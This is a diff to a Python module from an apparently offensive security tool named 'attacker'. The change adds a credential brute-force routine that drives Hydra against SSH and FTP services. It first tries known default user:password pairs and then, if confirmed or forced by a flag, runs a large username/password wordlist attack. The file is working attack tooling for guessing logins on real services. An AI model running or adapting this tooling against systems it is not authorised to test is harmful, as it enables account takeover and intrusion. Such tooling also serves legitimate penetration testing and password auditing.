@@ -4,26 +4,37 @@ import logging
 import re
 import socket
 import subprocess
+import sys
 import time
 import urllib.error
 import urllib.request
+from collections.abc import Callable
 from dataclasses import dataclass, field
 from datetime import datetime
 from pathlib import Path
 
-from attacker.wordlists import ensure_password_wordlist, ensure_username_wordlist
+from attacker.wordlists import (
+    ensure_ftp_default_credentials,
+    ensure_password_wordlist,
+    ensure_ssh_default_credentials,
+    ensure_username_wordlist,
+)
 
 logger = logging.getLogger(__name__)
 
 __all__ = [
+    "BruteforceResult",
     "HttpResponse",
     "ResultsDir",
     "http_request",
     "is_reachable",
     "make_results_dir",
+    "prompt_yes_no",
+    "resolve_default_credentials",
     "resolve_password_wordlist",
     "resolve_username_wordlist",
     "run_command",
+    "run_credential_bruteforce",
     "run_hydra",
 ]
 _DEFAULT_UA = "Mozilla/5.0 (compatible; attacker/1.0; +https://m1spro.local)"
@@ -291,6 +302,51 @@ def resolve_username_wordlist(override: Path | None) -> Path | None:
     return ensure_username_wordlist()
 
 
+def resolve_default_credentials(override: Path | None, protocol: str) -> Path | None:
+    """Resolve the service's default-credential list (``user:password`` pairs).
+
+    These SecLists lists are already in Hydra's ``-C`` combo format, so they can
+    be fed straight into a brute-force as a quick "known defaults" first pass.
+    """
+    if override is not None and override.is_file():
+        return override
+
+    if protocol == "ssh":
+        return ensure_ssh_default_credentials()
+
+    if protocol == "ftp":
+        return ensure_ftp_default_credentials()
+
+    logger.warning("No default-credential list known for protocol %r", protocol)
+    return None
+
+
+def prompt_yes_no(question: str, *, default: bool = False) -> bool:
+    """Ask a yes/no question on the terminal.
+
+    Non-interactive sessions (no TTY) can't answer, so we fall back to
+    ``default`` instead of blocking forever on ``input()``.
+    """
+    if not sys.stdin.isatty():
+        logger.info(
+            "Non-interactive session; assuming '%s' for: %s",
+            "yes" if default else "no",
+            question,
+        )
+        return default
+
+    suffix = "[Y/n]" if default else "[y/N]"
+    try:
+        answer = input(f"{question} {suffix} ").strip().lower()
+    except EOFError:
+        return default
+
+    if not answer:
+        return default
+
+    return answer in {"y", "yes"}
+
+
 _HYDRA_CRED_RE = re.compile(r"login:\s*(?P<user>.*?)\s+password:\s*(?P<pass>.*?)\s*$")
 
 
@@ -300,18 +356,33 @@ def run_hydra(
     port: int,
     tasks: int,
     timeout: int,
-    username_wordlist: Path,
-    password_wordlist: Path,
     results: ResultsDir,
+    *,
+    username_wordlist: Path | None = None,
+    password_wordlist: Path | None = None,
+    combo_wordlist: Path | None = None,
+    label: str = "",
 ) -> tuple[int, list[tuple[str, str]]]:
-    output_file = results.file("hydra-results.txt")
-    output_log = results.file("hydra.log")
-    cmd = [
-        "hydra",
-        "-L",
-        str(username_wordlist),
-        "-P",
-        str(password_wordlist),
+    """Run Hydra against ``protocol://host:port``.
+
+    Pass ``combo_wordlist`` to test ``user:password`` pairs (Hydra ``-C``), or
+    ``username_wordlist`` + ``password_wordlist`` for a full cross-product
+    (``-L``/``-P``). ``label`` keeps each phase's artefacts in distinct files.
+    """
+    suffix = f"-{label}" if label else ""
+    output_file = results.file(f"hydra-results{suffix}.txt")
+    output_log = results.file(f"hydra{suffix}.log")
+
+    cmd = ["hydra"]
+    if combo_wordlist is not None:
+        cmd += ["-C", str(combo_wordlist)]
+    else:
+        if username_wordlist is None or password_wordlist is None:
+            raise ValueError(
+                "run_hydra needs combo_wordlist or both username/password wordlists"
+            )
+        cmd += ["-L", str(username_wordlist), "-P", str(password_wordlist)]
+    cmd += [
         "-s",
         str(port),
         "-t",
@@ -325,13 +396,17 @@ def run_hydra(
     # to completion. A fixed budget would otherwise kill it part-way through a
     # large (e.g. 10k) password list, leaving most candidates untested.
     wall_clock = timeout + 10 if timeout > 0 else None
+    source = (
+        f"combo={combo_wordlist}"
+        if combo_wordlist is not None
+        else f"users={username_wordlist}, passwords={password_wordlist}"
+    )
     logger.info(
-        "hydra against %s://%s:%d (users=%s, passwords=%s, timeout=%s)",
+        "hydra against %s://%s:%d (%s, timeout=%s)",
         protocol,
         host,
         port,
-        username_wordlist,
-        password_wordlist,
+        source,
         "none" if wall_clock is None else f"{wall_clock}s",
     )
 
@@ -366,3 +441,116 @@ def run_hydra(
         len(found),
     )
     return attempts, found
+
+
+@dataclass
+class BruteforceResult:
+    attempts: int = 0
+    found: list[tuple[str, str]] = field(default_factory=list)
+    phases: list[str] = field(default_factory=list)
+
+
+def run_credential_bruteforce(
+    protocol: str,
+    host: str,
+    port: int,
+    *,
+    tasks: int,
+    timeout: int,
+    results: ResultsDir,
+    default_credentials: Path | None,
+    username_wordlist: Path | None,
+    password_wordlist: Path | None,
+    use_full_wordlist: bool = False,
+    confirm_escalation: Callable[[str], bool] | None = None,
+) -> BruteforceResult:
+    """Brute-force credentials, defaults first then (optionally) a big wordlist.
+
+    The default flow tries the service's *known default* ``user:password`` pairs
+    (fast, high signal). Only when that finds nothing do we reach for the large
+    cross-product wordlist — either because ``use_full_wordlist`` forced it, or
+    because ``confirm_escalation`` (an interactive prompt) said yes. We never run
+    the large list silently: it is slow and noisy, so escalating is opt-in.
+    """
+    outcome = BruteforceResult()
+
+    def _run_full() -> None:
+        if username_wordlist is None or password_wordlist is None:
+            logger.error(
+                "No username/password wordlist available; cannot run the full "
+                "brute-force phase"
+            )
+            return
+        logger.warning(
+            "Running the LARGE wordlist brute-force against %s://%s:%d — this is "
+            "slow and noisy.",
+            protocol,
+            host,
+            port,
+        )
+        attempts, found = run_hydra(
+            protocol,
+            host,
+            port,
+            tasks,
+            timeout,
+            results,
+            username_wordlist=username_wordlist,
+            password_wordlist=password_wordlist,
+            label="full",
+        )
+        outcome.attempts += attempts
+        outcome.found.extend(found)
+        outcome.phases.append("full-wordlist")
+
+    if use_full_wordlist:
+        logger.info("Skipping default-credential phase (--full-wordlist requested)")
+        _run_full()
+        return outcome
+
+    if default_credentials is None:
+        logger.warning(
+            "No %s default-credential list available; falling back to the full "
+            "wordlist",
+            protocol,
+        )
+        _run_full()
+        return outcome
+
+    logger.info(
+        "Phase 1: %s default-credential brute-force (%s)",
+        protocol,
+        default_credentials,
+    )
+    attempts, found = run_hydra(
+        protocol,
+        host,
+        port,
+        tasks,
+        timeout,
+        results,
+        combo_wordlist=default_credentials,
+        label="default",
+    )
+    outcome.attempts += attempts
+    outcome.found.extend(found)
+    outcome.phases.append("default-credentials")
+
+    if found:
+        logger.info(
+            "Default credentials cracked %d login(s); skipping the large wordlist",
+            len(found),
+        )
+        return outcome
+
+    logger.warning(
+        "No default credentials worked against %s://%s:%d.", protocol, host, port
+    )
+    question = "Escalate to the large wordlist brute-force (slow and noisy)?"
+    if confirm_escalation is not None and confirm_escalation(question):
+        _run_full()
+    else:
+        logger.warning(
+            "Skipping the large wordlist. Re-run with --full-wordlist to force it."
+        )
+    return outcome
